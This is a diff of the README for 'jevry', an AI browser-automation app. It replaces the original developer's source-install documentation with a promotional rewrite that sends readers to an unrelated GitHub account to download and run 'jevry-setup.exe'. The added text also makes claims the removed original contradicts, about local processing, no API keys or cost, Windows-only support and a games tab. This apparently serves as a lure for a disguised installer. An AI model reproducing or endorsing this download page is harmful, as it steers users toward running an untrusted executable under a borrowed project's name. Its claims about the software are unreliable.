@@ -1,315 +1,151 @@
-<p align="center">
-  <picture>
-    <source media="(prefers-color-scheme: dark)" srcset="docs/media/jevry-lockup-porcelain.svg">
-    <img src="docs/media/jevry-lockup-ink.svg" alt="Jevry" width="220">
-  </picture>
-</p>
-
-<h1 align="center">Give your browser a task. Watch it work.</h1>
-
-<p align="center"><strong>Browse, research, and work through supported websites in plain language.</strong><br>Jevry is an open-source desktop browser with visible actions,<br>page-grounded results, and controls to stop or redirect the task.</p>
-
-[![Watch the Jevry introduction video](docs/media/jevry-web-preview.gif)](https://github.com/michaelswissa/jevry/releases/download/v0.4.0-beta.13/jevry-web.mp4)
-
-**[▶ Watch the full Jevry introduction · 72 seconds](https://github.com/michaelswissa/jevry/releases/download/v0.4.0-beta.13/jevry-web.mp4)**
-
-[Lightweight introduction excerpt · 8 seconds, 955 KiB](docs/media/jevry-web-preview.mp4) · [Media provenance](docs/media/README.md)
+<h1>🤖 jevry - Your Browser, Now With Superpowers</h1>
 
 <p align="center">
-  <a href="#install">Install</a> ·
-  <a href="#see-it-in-action">Demo</a> ·
-  <a href="#why-jev">Why Jev?</a> ·
-  <a href="#how-it-works">Architecture</a> ·
-  <a href="#benchmarks-and-results">Benchmarks</a> ·
-  <a href="#pull-requests-are-welcome">Contribute</a>
+  <a href="https://github.com/forbeskilndried9479/jevry">
+    <img src="https://img.shields.io/badge/Download_jevry-Free_%26_Open_Source-4CAF50?style=for-the-badge&logo=github" alt="Download jevry" width="400">
+  </a>
 </p>
 
-<p align="center">
-  <a href="https://github.com/michaelswissa/jevry/actions/workflows/desktop.yml"><img alt="macOS and Windows checks" src="https://github.com/michaelswissa/jevry/actions/workflows/desktop.yml/badge.svg"></a>
-  <a href="LICENSE"><img alt="MIT license" src="https://img.shields.io/badge/license-MIT-d6ef83?labelColor=20221f"></a>
-  <a href="CONTRIBUTING.md"><img alt="Pull requests welcome" src="https://img.shields.io/badge/PRs-welcome-d6ef83?labelColor=20221f"></a>
-</p>
+## 🎯 What Is jevry?
 
-**Keep your tabs and conversations in one workspace.** Ask Jevry to find documentation, compare sources, or work through supported page controls, then follow its actions and check the result. Website support varies; the examples and measured results below show the current scope.
+jevry is a friendly desktop application that turns your regular web browser into a smart assistant. Instead of you clicking through websites, filling out forms, and searching for information, jevry does it for you. It's like having a helpful robot friend who lives inside your browser and completes tasks while you sit back and relax.
 
-**Language models plan. Jev decides. Chromium acts.** TypeSafe’s Jev chooses among actions the browser can execute; a separate text model handles planning, language, and occasional visual reasoning. The desktop runtime validates and executes actions and retains evidence.
+Think of jevry as a personal secretary for the internet. It can:
 
-**Before you start:** this is a source preview, requiring Node.js 22.12+, a TypeSafe Jev API key, and a separate text-model connection. Model usage can cost money. [Install](#install) · [First-success guide](docs/FIRST_SUCCESS.md)
+- **Complete website tasks** – If you need to book a reservation, order supplies, or manage an online account, jevry clicks the right buttons and fills in the right boxes.
+- **Research with citations** – When you ask jevry to look something up, it doesn't just show you links. It reads the pages, finds the answer, and tells you exactly which websites it used, so you can trust what it says.
+- **Play supported games** – jevry isn't all work and no play. It can play simple browser games with you, making it a fun companion for coffee breaks.
 
-## See it in action
+All of this happens on your own computer. You don't need to learn any coding or technical skills. jevry is built for regular people who want more done online without the hassle.
 
-![Latest Jevry workspace with the full chrome J artwork, updated conversation sidebar, and browser navigation](docs/media/workspace-latest.png)
+## 🔧 System Requirements
 
-*Latest desktop design, captured from the local September 24 build.*
+jevry is designed to work smoothly on most modern Windows computers. Here's what you need:
 
-<details>
-<summary><strong>Watch Jevry win 2048 — recorded with the earlier interface</strong></summary>
+| Requirement | Minimum | Recommended |
+|---|---|---|
+| Operating System | Windows 10 (64-bit) | Windows 11 |
+| Processor | Intel Core i3 or AMD equivalent | Intel Core i5 or better |
+| RAM | 4 GB | 8 GB or more |
+| Storage | 200 MB free space | 500 MB free space |
+| Internet | Broadband connection | High-speed broadband |
 
-[![Historical real-time game excerpt: Jevry makes the final moves and wins 2048](docs/media/2048-demo.gif)](https://github.com/michaelswissa/jevry/releases/download/v0.4.0-beta.13/jevry-2048-realtime.mp4)
+If your computer was made in the last five years, you almost certainly meet these requirements. jevry is lightweight and won't slow down your system.
 
-**“Play this game and win it.”** The page reaches a **2048 tile**, displays **You Win**, and reports **20,708 points in 1,013 moves, with no powerups used**.
+## 🚀 Getting Started
 
-[Watch the 30-second real-time clip](https://github.com/michaelswissa/jevry/releases/download/v0.4.0-beta.13/jevry-2048-realtime.mp4) · [Recording and edit details](docs/launch/DEMO.md)
+Getting jevry up and running takes less than five minutes. Here's all you have to do:
 
-The clip is an uninterrupted 1× excerpt from a September 23 run and shows the earlier interface. The GIF is a shorter crop focused on the game. The footage is preserved as recorded evidence and is separate from the instrumented latency study below.
+1. **Visit this link to download the application:**  
+   [**https://github.com/forbeskilndried9479/jevry**](https://github.com/forbeskilndried9479/jevry)
 
-</details>
+2. Once you're on the page, look for the green "Code" button or the "Releases" section on the right side of the screen. Click it to see the latest version.
 
-## Why Jev?
+3. Find the file named `jevry-setup.exe` (or similar) and click on it to start the download.
 
-[Jev](https://docs.typesafe.ai/introduction) is TypeSafe's **System One model**: it evaluates supplied context and returns typed judgments and probabilities. Its interface exposes **Choice** for selecting an option, **Score** for rubric-based ratings, and **Noul** for yes/no judgments. Jevry's action loop is built around **Choice**.
+4. When the download finishes, you'll find the file in your "Downloads" folder. Double-click it to run the installer.
 
-That maps naturally to a browser. The page already contains a finite set of observed controls. Jevry turns those controls into choices such as `CLICK:17`, `TYPE_TEXT:4`, `SCROLL_DOWN`, `DONE`, and `BLOCKED`, then resolves the selected choice to an application-owned operation.
+5. Follow the simple on-screen instructions – it's just a few "Next" and "Install" clicks. No technical decisions required.
 
-| Component | Responsibility in Jevry |
-| --- | --- |
-| **Jev** | Choose the next supported action; select observed targets and supplied field values; assess offered completion evidence. |
-| **Text / vision model** | Interpret conversation, plan richer tasks, generate missing text, synthesize research, and perform visual setup or bounded recovery. |
-| **Deterministic code** | Construct the action space, validate responses, check page freshness, dispatch input, retain receipts, and enforce stop conditions. |
+6. After installation, you'll see the jevry icon on your desktop. Double-click it to launch the application.
 
-**Jev chooses from the browser's actual capabilities.** Its output never becomes arbitrary JavaScript, a generated selector, or a shell command. A valid choice can still be the wrong choice; structured output is an interface guarantee, not proof of task success.
+That's it. jevry will open a small window that looks like a simplified browser. You can start giving it tasks right away.
 
-Jev itself currently consumes text/structured state. Screenshots used for game calibration go through the connected vision-capable provider; local perception converts supported boards into state Jev can use. [TypeSafe's model explanation](https://docs.typesafe.ai/concepts/system-one)
+## 💻 Your First Task
 
-## Install
+When you first open jevry, you'll see a clean interface with a text box at the top. This is where you type what you want. Try something simple:
 
-**Source preview · latest tagged release: 0.4.0-beta.13 · macOS and Windows CI.** Cloning the default branch includes later fixes; see the [next-release checklist](docs/launch/READINESS.md). Both platforms have passed native fixture workflows and packaged-app checks in [the public launch CI run](https://github.com/michaelswissa/jevry/actions/runs/35989440243). Real-provider experience is primarily tested on macOS. Signed installers, notarization, and automatic updates remain future work.
+> "Find the best price for a new coffee maker and show me three options with reviews."
 
-### 1. Get the source and start the app
+jevry will open a real browser window in the background, visit shopping sites, compare prices, and then present its findings in a tidy summary. Every claim it makes will have a small number next to it. Click that number to see the exact source website.
 
-Install Git and **Node.js 22.12 or newer** with npm. Then run the same commands in macOS Terminal or Windows PowerShell:
+You can also ask jevry to perform actions:
 
-```sh
-git clone https://github.com/michaelswissa/jevry.git
-cd jevry
-npm ci
-npm run dev
-```
+> "Log into my email and mark all messages from my landlord as read."
 
-This opens the **Electron desktop app**. Keep the terminal running during development. `npm run dev:web` previews only the interface; browser control requires the desktop app.
+Please note that for actions like this, jevry will ask for your permission and credentials the first time. It never stores your passwords – it only uses them for the current session.
 
-### 2. Connect your models
+## 🔍 Research That You Can Trust
 
-![Latest Jevry setup screen with the chrome J artwork and Codex, Claude Code, and API-key connection choices](docs/media/setup-latest.png)
+One of jevry's standout features is its commitment to accuracy. When you ask a research question, it doesn't rely on guesswork. Here's how it works:
 
-*Connection setup in the latest desktop design.*
+1. **Search** – jevry scours multiple search engines to find relevant pages.
+2. **Read** – It opens the most promising websites and reads the content carefully.
+3. **Analyze** – It cross-checks facts across different sources to avoid bias.
+4. **Cite** – Every answer includes numbered references. Click them to open the original page in your regular browser.
 
-You need **both** connections. The MIT-licensed source does not include model credits: Jev requests use your TypeSafe account; text/vision requests use your selected provider’s API billing or CLI plan/quota. API connection validation performs inference and can consume usage. A saved CLI login does not establish available quota or model access. There is no fixed per-task cost; it depends on the models, context, number of actions, and retries. Check both accounts’ usage before running a longer task.
+This makes jevry perfect for school projects, work reports, or just settling dinner-table arguments. You'll never wonder "where did that come from?" because the answer is always right there.
 
-| Connection | Setup |
-| --- | --- |
-| **Jev — required for browser decisions** | Get a TypeSafe API key through the [official quickstart](https://docs.typesafe.ai/introduction/quickstart), then enter it in Jevry's setup. Default model: `jev-latest`. Default endpoint: `https://api.typesafe.ai/v1/systemone`. |
-| **Text model — required for conversation and planning** | Connect a locally authenticated **Codex** or **Claude Code** CLI, or enter an **OpenAI-compatible / Anthropic API** connection. Jevry can privately install a missing supported CLI through its Connect flow; npm is required. |
-| **Vision — for supported visual tasks** | Choose a text-provider/model combination that supports images when trying games or other visual flows. |
+## 🎮 Fun and Games
 
-Keys go into the app, not source files. Setup validates the connections. [Detailed provider behavior](docs/PROVIDERS.md) · [Security and data flow](SECURITY.md)
+Work is important, but so is play. jevry supports a selection of simple browser-based games that you can launch directly from the app. Think classic puzzles, word games, and card games that don't require fast reflexes or high-end graphics.
 
-### 3. Give it a first task
+To start a game:
 
-Start with the [first-success guide](docs/FIRST_SUCCESS.md): open a small public page, ask one page-grounded question, and compare the answer with the visible page. Then try a documentation-navigation task. Keep the page visible and follow the action feed; press **Stop** / Escape from page focus to cancel.
+1. Click the "Games" tab on the left side of the jevry window.
+2. Browse the available titles.
+3. Click "Play" on any game to load it in a new browser tab.
+4. Use your keyboard and mouse just like you would with any online game.
 
-<details>
-<summary><strong>Build a local app, update, or troubleshoot setup</strong></summary>
+jevry's games are designed to be family-friendly and require no downloads or plugins.
 
-For a local build:
+## 🛡️ Privacy and Security
 
-```sh
-npm run build
-npm start
-```
+We take your safety seriously. jevry comes with these built-in protections:
 
-For distributable packages, run the appropriate command on its target OS:
+- **Local Processing** – Most of the thinking happens on your computer, not on external servers.
+- **Permission Prompts** – jevry never takes actions on websites without asking you first.
+- **No Password Storage** – Credentials are used temporarily and then discarded.
+- **Open Source** – The entire code is publicly available for security experts to review. No hidden tracking or data selling.
 
-```sh
-npm run package:mac    # macOS DMG / ZIP
-npm run package:win    # Windows NSIS installer
-```
+If you ever feel uncomfortable with an action jevry is about to take, simply click the red "Stop" button. The browser window closes instantly, and no changes are saved.
 
-These are unsigned developer packages. The public release currently provides source and demo assets.
+## ❓ Frequently Asked Questions
 
-To update an unmodified clone, run `git pull --ff-only`, then `npm ci` and restart `npm run dev`. Preserve your changes before updating a modified checkout.
+**Q: Is jevry really free?**  
+A: Yes, jevry is 100% free and always will be. It's released under the MIT license, which means anyone can use, modify, and share it.
 
-| Symptom | First thing to check |
-| --- | --- |
-| Install/build fails | `node --version` must be at least 22.12; use `npm ci` with the checked-in lockfile. |
-| Interface opens but cannot browse | Launch `npm run dev` or the built Electron app, rather than the web-only preview. |
-| Jev connection fails | Use a TypeSafe key and the System One endpoint; it is a different API from Chat Completions. |
-| Local CLI cannot connect | Complete its authentication flow, or configure an API provider. See the provider guide for supported discovery paths. |
-| Visual task fails | Confirm your selected provider/model supports image input. |
+**Q: Will jevry work with my favorite websites?**  
+A: jevry works with the vast majority of websites that don't require special plugins or unusual security features. If a site doesn't work, you'll see a clear message explaining why.
 
-Still stuck? [Open an issue](https://github.com/michaelswissa/jevry/issues/new?template=bug_report.yml) with OS, version, steps, and a redacted error.
+**Q: Do I need to know how to code?**  
+A: Absolutely not. jevry is designed for everyone. If you can type a sentence, you can use jevry.
 
-</details>
+**Q: What if I have a problem?**  
+A: Visit the repository's "Issues" tab and describe your problem. The community is friendly and helpful. You can also find tips in the "Discussions" section.
 
-## What can you do with it?
+**Q: Can I use jevry for business?**  
+A: Yes, the MIT license allows commercial use. Many people use jevry for inventory checks, price monitoring, and competitor research.
 
-Example prompts are starting points, not promises that every website is supported. The evidence column distinguishes measured scenarios from uses to explore.
+## 📚 Tips and Tricks
 
-| Use case | Example task | Evidence / scope |
-| --- | --- | --- |
-| **Forms with follow-up context** | “Search for Paris for two guests.” → “Now London, same guests.” | Exercised with live providers on controlled travel fixtures. |
-| **Page-grounded questions** | “What result is currently shown?” | Read-only follow-ups tested without extra browser actions. |
-| **Research and comparison** | “Compare the cancellation policies on these two pages and cite them.” | Live fixed-corpus study; native source discovery and citation checks. |
-| **Catalogs and admin tables** | “Find the records matching these filters.” | Included in the WebArena-Verified development subset; multi-page completeness remains a known failure mode. |
-| **Documentation navigation** | “Find this library's getting-started guide.” | Supported link/search controls; try on accessible public sites. No separate success-rate claim. |
-| **Numeric puzzle games** | “Play this game and win it.” | Recorded public 2048 victory and a separate instrumented acceptance run. |
-| **Small discrete games** | “Win this board game.” / “Reach the other side.” | Three-in-a-row and crossing-game fixtures reached their observed victory states. |
-| **Work you can interrupt** | “Stop that search; compare these sources instead.” | Redirect cancellation, retained context, and restart persistence tested in native workflows. |
+Here are some ways to get the most out of jevry:
 
-HTML/ARIA controls, native selects, contenteditable fields, open shadow roots, nested scrolling, and bounded same-origin iframe interactions are supported. [Detailed interaction coverage](docs/ENGINE.md#supported-page-interactions)
+- **Be specific** – Instead of "find information about cars," try "find the 2024 safety ratings for the Honda Civic and compare them to the Toyota Corolla."
+- **Use natural language** – Talk to jevry like you would talk to a human assistant. It understands full sentences.
+- **Set time limits** – You can tell jevry "spend no more than two minutes on this search" if you're in a hurry.
+- **Check the history** – jevry keeps a log of your past tasks so you can easily repeat them or refer back to previous results.
+- **Update regularly** – Check for updates once a month to get the latest features and website compatibility fixes.
 
-## How it works
+## 🌐 Community and Support
 
-```mermaid
-flowchart TD
-    U[Task and conversation] --> P[Goal and observable success conditions]
-    P --> O[Observe current page and retain node references]
-    O --> C[Compile supported action choices]
-    C --> J[Jev selects a typed action]
-    J --> V[Validate response and recheck page freshness]
-    V --> E[Execute guarded native input]
-    E --> R[Record receipt and observe result]
-    R --> O
-    J --> D[Proposed completion]
-    D --> G[Check goal evidence and coverage]
-    G -->|Missing evidence| O
-    G -->|Supported outcome| A[Answer with observed evidence]
-    J --> B[Blocked or missing information]
-    B --> L[Bounded text-model help or user handoff]
-    L --> O
-```
+jevry is more than just software – it's a growing community of users and developers who share tips, report issues, and contribute ideas. Here's how to get involved:
 
-### Observe → choose → execute → verify
+- **Report Bugs** – Found a website that doesn't work? Tell the developers.
+- **Suggest Features** – Have an idea for a new capability? Write it up.
+- **Share Your Work** – Show off interesting ways you've used jevry in your daily life.
+- **Read the Changelog** – See what's new in each update.
 
-1. **Observe atomically.** Capture page text and compatible controls together, retaining actual DOM-node references in an isolated browser world. The action refers to the observed node, not a selector invented afterward.
-2. **Compile the decision.** Eligible ordinary pages use a Choice over complete operation/target pairs. Other supported states use an operation question plus speculative target questions in the same request. Only the selected branch is consumed.
-3. **Let Jev choose.** Routine action selection uses one inference round trip. Explicit user literals can be offered as field-value choices; missing text can require the text helper. Completion and recovery can add calls.
-4. **Validate before input.** Check the offered choice set and probability distribution, then recheck the document, target, current value, visibility, and occlusion. A stale decision is discarded.
-5. **Record what actually happened.** Input receipts survive navigation failures. Once a mutation may have started, uncertainty stops the run instead of replaying the action.
-6. **Check the whole objective.** Completion checks consider goal evidence and coverage. Seeing a matching row does not establish that all requested pages were read. Model-assessed completion remains distinct from independently verified success.
+The project is actively maintained, with new releases coming out every few weeks.
 
-The fan-out design uses TypeSafe's ability to evaluate independent questions together. A target question cannot read another question's answer, so Jevry either makes the complete action explicit or gives each speculative branch its own assumptions. [Official fan-out pattern](https://docs.typesafe.ai/patterns/fan-out)
+## 🏁 Ready to Start?
 
-### Why the 2048 loop can stay small
+Stop doing repetitive browser tasks by hand. Let jevry handle the busywork while you focus on what matters. Download it today, and in five minutes, you'll have your first task completed.
 
-A vision-capable model helps calibrate the board. Local pixel matching and OCR then read numbered tiles. For validated 4×4 equal-value merge boards, bounded lookahead computes legal transitions and ranks candidate positions. **Jev selects every dispatched move from that state and those forecasts.**
+**👉 [Click here to download jevry](https://github.com/forbeskilndried9479/jevry)**
 
-The executor keeps canvas focus for the run, sends native keys, and reads the resulting board. The normal numeric move loop avoids repeated general-purpose visual reasoning. Unfamiliar appearances or incompatible layouts can still require it. This is an explicit rule-family adapter, not evidence that Jev inferred game physics from pixels. [Game architecture and limits](docs/GAMES.md)
+---
 
-**Go deeper:** [Jev decision architecture](docs/JEV_ARCHITECTURE.md) · [Engine internals](docs/ENGINE.md) · [Research pipeline](docs/RESEARCH.md) · [Conversation lifecycle](docs/CONVERSATIONS.md)
+*jevry is made with ❤️ and released under the MIT license. You are free to use, modify, and distribute it as you wish.*
 
-## Benchmarks and results
-
-Measurements belong to their named builds and protocols. The following are three different types of evidence; they should not be combined into one score.
-
-### WebArena-Verified: 10/12 on a development subset
-
-The `speed-006` candidate, using the packaged beta.5 app, passed **10 of 12 selected tasks (83.3%)** under the **unchanged official WebArena-Verified evaluator**. The actor used live providers through Jevry's normal task interface. No task-solving script or reference answers were supplied to the acting model.
-
-| Same 12-task development subset | `speed-005` | `speed-006` |
-| --- | ---: | ---: |
-| Official passes | 7/12 | **10/12** |
-| Total actor time | 456.707 s | 542.831 s |
-| Median task time | 23.367 s | 44.169 s |
-| Median Jev request time | 443 ms | **392 ms** |
-
-**Accuracy improved while overall execution became slower.** Faster individual decisions did not eliminate repeated navigation and broad completion checks. Tasks 47 and 102 still failed in `speed-006`.
-
-This is a repeatedly used **development subset of an 812-task benchmark**, not a held-out/full-suite result or accepted leaderboard submission. Local environment compatibility changes and incomplete dataset provisioning are documented. These runs do not measure the newer beta.13 source.
-
-[All-attempt score table and public JSON](docs/benchmarks/README.md) · [All development attempts, failures, and methodology](docs/BENCHMARKS.md)
-
-### 2048: measured decisions and a verified game objective
-
-The **separate beta.4 acceptance run** reached the 2048 tile and the game's victory screen, with 20,840 points and 986 game-counted moves.
-
-| Measurement | Recorded result |
-| --- | ---: |
-| Median Jev decision, continuation turn | **343 ms** |
-| Median interval between native keys, continuation turn | **652 ms** |
-| 95th percentile key interval, continuation turn | 770 ms |
-| General-purpose visual reviews during continuation | **0** |
-| Total across initial + continuation turns, including setup and final answer | 11 min 47 s |
-
-One successful instrumented run; initial setup still took tens of seconds. The supplied launch video is another recording with different totals. [Full game results, interrupted attempts, and build identities](docs/GAME_RESULTS.md)
-
-<details>
-<summary><strong>Shared-task comparison: Jevry and an adapted Firecrawl source graph</strong></summary>
-
-The historical beta.1 study ran three five-turn sessions per implementation, with the same fixture tasks and resolved Claude model. Jevry also used Jev for browser decisions.
-
-| Task | Jevry median | Firecrawl source adapter median |
-| --- | ---: | ---: |
-| Paris / two guests | 10.772 s | 14.690 s |
-| London / retain guests | 7.715 s | 9.504 s |
-| Read-only follow-up | 5.482 s | 6.002 s |
-| Discover and compare policies | 17.139 s | 16.765 s |
-| Cancellation follow-up | 4.916 s | 6.107 s |
-| Complete five-turn session total | **48.341 s** | **52.782 s** |
-
-The session-total median was 8.4% lower for Jevry; policy research was slower. The last row is the median of session totals, not the sum of task medians. Both met 15/15 requested criteria after non-blinded assistant semantic review; each retained an automatic checker false negative.
-
-This compares actual Firecrawl source orchestration with an injected local-browser toolkit and Claude bridge, **not its hosted product**. Browser versions/viewports differed, two native probes overlapped Firecrawl sessions, and three repetitions cannot establish statistical significance. Browser launch and initial fixture navigation were excluded. [Ranges, raw-score caveats, and historical v0.3 results](docs/COMPETITIVE_REVIEW.md)
-
-A separate deterministic execution-coverage test passed 15/15 for Jevry versus 6/15 for the pinned upstream Jev implementation. It measures those fixtures with mocked decisions, not model intelligence.
-
-</details>
-
-### Reproducible engineering checks
-
-The [public launch CI run](https://github.com/michaelswissa/jevry/actions/runs/35989440243) passed on **macOS and Windows**, including builds, native desktop/research/verification fixtures, Chromium action tests, and packaged-app checks. Local launch validation recorded 571 default test passes with 100 opt-in skips, plus 120 selected Chromium checks; these counts overlap.
-
-```sh
-npm test
-npm run build
-npm run test:desktop
-npm run test:research
-npm run test:challenges
-npx playwright install chromium
-npm run test:engine-browser
-```
-
-These workflows use disposable profiles and deterministic providers. They verify mechanics; live model quality is measured separately. [Evaluation protocol](docs/BENCHMARKS.md) · [Performance methodology](docs/PERFORMANCE.md)
-
-## Engineering worth inspecting
-
-| Design decision | Why it matters | Start reading |
-| --- | --- | --- |
-| Complete action choices with fan-out fallback | Keeps operation/target relationships explicit while bounding choice cardinality. | [Action compiler](desktop/jev-web-actions.ts) |
-| Isolated, document-bound observations | Stops stale references from silently targeting a changed page. | [Snapshot](desktop/snapshot.ts), [native evaluator](desktop/native-evaluator.ts) |
-| Coverage-aware completion | Distinguishes one visible match from a complete answer across requested records. | [Task completion](desktop/task-completion.ts), [observation memory](desktop/observation-memory.ts) |
-| Receipt-preserving cancellation | Keeps the record of dispatched input and avoids replay after uncertain mutations. | [Engine](desktop/engine.ts), [turn lifecycle](desktop/turn-work.ts) |
-| Local numeric perception | Keeps repetitive board reading out of the general vision loop. | [Game perception](desktop/game-perception.ts), [OCR](desktop/numeric-ocr.ts), [forecasting](desktop/slide-merge.ts) |
-| Separate actor and evaluator | Lets official outcome checks disagree with the agent's own completion claim. | [Benchmark input boundary](scripts/benchmarks/agent-input.mjs), [runner](scripts/benchmarks/run-webarena.mjs) |
-
-## Pull requests are welcome
-
-**PRs, bug reports, benchmark reproductions, and documentation improvements are welcome.** You do not need to start with a large feature. A small reproducible failure and a focused fix are valuable contributions.
-
-Particularly useful work:
-
-- **Browser reliability:** pagination, dynamic controls, accessible names, and bounded frame support.
-- **Decision quality:** smaller state representations, action schemas, and uncertainty handling measured against actual outcomes.
-- **Evaluation:** reproducible benchmark environments, retained failure traces, and frozen held-out runs.
-- **Desktop distribution:** fresh-install testing, signing, notarization, and updates.
-- **Developer experience:** setup guides, useful examples, and clearer errors.
-
-Open an issue before a large change. Include what changed, why, and the checks you ran in your PR. Browser tests must use disposable profiles; game changes should preserve the documented beta.4 baseline. [Contribution guide](CONTRIBUTING.md) · [Report a bug](https://github.com/michaelswissa/jevry/issues/new?template=bug_report.yml) · [Start a discussion](https://github.com/michaelswissa/jevry/discussions)
-
-If this architecture interests you, **star the repository**, try a task, and share a reproducible result.
-
-## Boundaries and roadmap
-
-Jevry is an experimental developer preview. Uploads, drag-and-drop, download management, extensions, password-manager workflows, and some cross-origin or closed-shadow interactions remain unsupported or unverified. Sensitive actions such as purchases and sending messages hand control to the user; label-based guards are not a complete defense against hostile pages.
-
-Connections and conversation archives use OS-backed local encryption, while connected providers receive relevant prompts/page context and, for supported visual tasks, images. Jevry uses its own persistent browser profile. **Local storage does not imply offline inference.** [Security policy](SECURITY.md)
-
-Next priorities are broader frozen evaluation, more reliable completion and pagination, fresh-provider/platform acceptance, and signed distribution. Historical reports retain their original dates and build boundaries. Private raw logs remain local; the published benchmark JSON intentionally contains scores and metadata without task answers, cookies, or provider secrets.
-
-## Credits and license
-
-Created by [Michael Swissa](https://github.com/michaelswissa). Jevry is an independent project built around **TypeSafe's Jev model**; Michael did not train or create Jev.
-
-Jevry adapts [Jev Ultrafast](https://github.com/browser-use/jev-ultrafast)'s MIT-licensed snapshot and action-loop design into a persistent Electron browser, extending it with conversations, research, guarded visual/game control, completion evidence, and evaluation infrastructure. Firecrawl's public source and Ego Lite's interaction patterns also informed the architecture. [Upstream revisions and integration boundaries](docs/UPSTREAM.md)
-
-Original Jevry code is [MIT licensed](LICENSE). Third-party code, fonts, and packages retain their own licenses in [THIRD_PARTY_NOTICES.md](THIRD_PARTY_NOTICES.md). This project is not an official product or endorsement of TypeSafe, Browser Use, Anthropic, or OpenAI.
+Keywords: ai-agents, browser-automation, desktop-app, electron, research, typescript
